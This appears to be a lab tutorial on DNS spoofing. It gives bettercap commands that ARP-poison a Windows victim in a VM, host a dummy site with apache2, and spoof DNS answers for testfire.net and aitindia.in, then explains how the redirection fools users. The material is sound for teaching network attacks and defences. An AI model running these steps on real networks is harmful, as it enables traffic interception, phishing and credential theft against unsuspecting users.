## What is DNS Spoofing?

DNS spoofing (also known as DNS cache poisoning) is a cyberattack where an attacker corrupts the Domain Name System (DNS) resolution process by injecting false information. This causes a DNS server or resolver to return an incorrect IP address for a domain name, redirecting users to a malicious website instead of the legitimate one. The user sees the correct domain in their browser but connects to an attacker-controlled server, enabling phishing, data theft, malware distribution, or man-in-the-middle (MITM) attacks.















We are going to perform DNS spoof attack using **bettercap** tool ------

## Step 1 : First we have to perform Arp-Poisoning atttack with the victim machine (Using bettercap tool)

How to Perform (In VM):

We have two machines **Kali** (Attacker)  and  **Windows** (Victim)  machines.

```
sudo bettercap --iface eth0

net.probe on

arp.spoof on

set arp.spoof.targets 192.168.229.132 (Victim IP)

```

--------------

## Step 2 : Start apache on kali

```
sudo systemctl start apache2 
```

Here we host a dummy website 

------------
## Step 3 : Starting dns spoofing 

```
set dns.spoof.address 192.168.229.131 (Attacker IP)

set dns.spoof.domains testfire.net,aitindia.in

dns.spoof on
```

-----------
### How the Attack Works (Step-by-Step Overview)

1.**ARP Poisoning/Spoofing**: The attacker tricks the victim's Windows machine and the network gateway (router) into sending traffic through the attacker's Kali machine. This positions the attacker as a MITM.


2.**DNS Interception and Spoofing**: While in the middle, the attacker captures DNS queries (e.g., for "facebook.com") from the victim and replies with a fake IP pointing to a malicious server (often hosted on the Kali machine itself, e.g., a phishing page).


3.**Redirection**: The Windows user types a legitimate URL but loads the attacker's fake site. The browser shows the correct domain, making it hard to detect (especially without HTTPS warnings).


